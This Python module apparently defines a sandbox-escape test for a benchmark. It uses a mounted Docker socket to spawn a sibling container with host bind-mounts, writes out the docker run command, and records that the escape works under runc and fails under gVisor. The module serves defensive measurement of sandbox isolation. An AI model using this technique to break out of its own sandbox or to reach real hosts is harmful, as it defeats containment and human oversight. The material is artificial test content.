"""Escape via a mounted Docker socket: a well-known, common misconfiguration
(LINUX.md catalogue: "Docker socket access"). If /var/run/docker.sock is reachable
inside the sandbox, anything inside it can ask the HOST's real Docker daemon to
spawn a sibling container with arbitrary host bind-mounts -- full host breakout,
not merely "can see the socket". That's what this attack actually does: it spawns
a second container (via the mounted socket) that touches this run's escape marker
at its real, absolute path on the VM's own filesystem.

Config mounts the socket AND overrides the image to docker:27-cli (the official,
minimal Docker-CLI-only image) -- the pinned default image (ubuntu:24.04) has no
docker client installed, and this attack needs one to speak to the socket.
Confirmed against the live VM: docker:27-cli's client talks cleanly to the host's
dockerd over a mounted socket.
"""
from .base import Attack

ATTACK = Attack(
    name="escape_docker_socket",
    category="escape",
    description="Use a mounted docker.sock to spawn a sibling container that touches the escape marker",
    targets=("docker", "gvisor"),  # not e2b: see targets/e2b.py's module docstring on scope
    command=(
        "timeout {timeout_margin} docker run --rm "
        "-v /var/sbx-bench:/var/sbx-bench alpine:3.20 touch {escape_marker}"
    ),
    config={
        "volumes": {"/var/run/docker.sock": "/var/run/docker.sock"},
        "image": "docker:27-cli",
    },
    timeout=20.0,
    notes=(
        "This is the misconfigured variant by construction -- the config IS the "
        "vulnerability (LINUX.md's point: measure how badly a common misconfig "
        "fails, not just whether it exists). Run again with config=None against "
        "the same target as a negative control: the mount is gone, so this must "
        "fail outright (not merely 'blocked' by the sandbox).\n"
        "Verified live on sbx-test: under plain Docker (runc) this escapes "
        "cleanly. Under gVisor (runsc) it is scored 'blocked', but the raw error "
        "is 'Cannot connect to the Docker daemon', not a permission refusal -- "
        "the mounted socket file IS visible and correctly typed as a socket "
        "(confirmed via stat, same inode both runtimes), yet connect() through "
        "it fails only under gVisor. This looks like a limitation of gVisor's "
        "gofer-mediated filesystem/socket proxying for a bind-mounted host "
        "socket, not necessarily a deliberate defense against this specific "
        "misconfiguration -- worth stating with that caveat in any report, not "
        "as 'gVisor blocks the Docker-socket escape'."
    ),
)
